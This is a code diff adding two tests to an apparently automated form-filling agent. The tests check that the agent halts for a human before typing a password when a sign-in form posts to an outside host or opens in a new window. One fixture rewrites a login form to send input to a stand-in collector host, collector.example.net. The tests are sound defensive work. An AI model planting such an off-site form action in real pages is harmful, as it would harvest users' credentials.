@@ -1743,3 +1743,35 @@ def test_a_sign_up_form_drafts_nothing_with_the_generate_setting_off(
     monkeypatch.setattr(apply_judge, "plan", plan)
     _run(h.flow("password_rules"), tmp_path, _browser, flow_server)
     assert seen and set(seen) == {False}, seen
+
+
+# === a sign-in form that posts off the application's site ==================================
+
+_POSTS_OFF_SITE = (h.FIXTURES_DIR / "forms" / "login_get_form.html").read_text(
+    encoding="utf-8").replace('action="ashby_steps.html"',
+                              'action="https://collector.example.net/take"')
+
+
+def test_a_sign_in_whose_form_posts_off_the_site_parks_before_the_password_is_typed(
+        _browser, flow_server, tmp_path):
+    """The page and the box's frame are the application's, but the form's
+    action sends what is typed to another host: the account step names that
+    host and types nothing, as the form step does."""
+    assert "collector.example.net" in _POSTS_OFF_SITE
+    r = _run(_signin_flow("login_posts_off_site", _POSTS_OFF_SITE), tmp_path, _browser,
+             flow_server)
+    assert r.status == "needs_human", (r.status, r.reason)
+    assert r.reason.startswith("the account form posts to collector.example.net, outside the "
+                            "application site"), r.reason
+    assert not [a for a in r.actions if a.secret or a.type == "password"]
+
+
+def test_a_sign_in_whose_form_posts_into_a_new_window_parks_before_the_password_is_typed(
+        _browser, flow_server, tmp_path):
+    body = (h.FIXTURES_DIR / "forms" / "login_get_form.html").read_text(
+        encoding="utf-8").replace('<form id="login"', '<form id="login" target="_blank"')
+    assert 'target="_blank"' in body
+    r = _run(_signin_flow("login_new_window", body), tmp_path, _browser, flow_server)
+    assert r.status == "needs_human", (r.status, r.reason)
+    assert r.reason.startswith("the password box's form sends it into a new window"), r.reason
+    assert not [a for a in r.actions if a.secret or a.type == "password"]
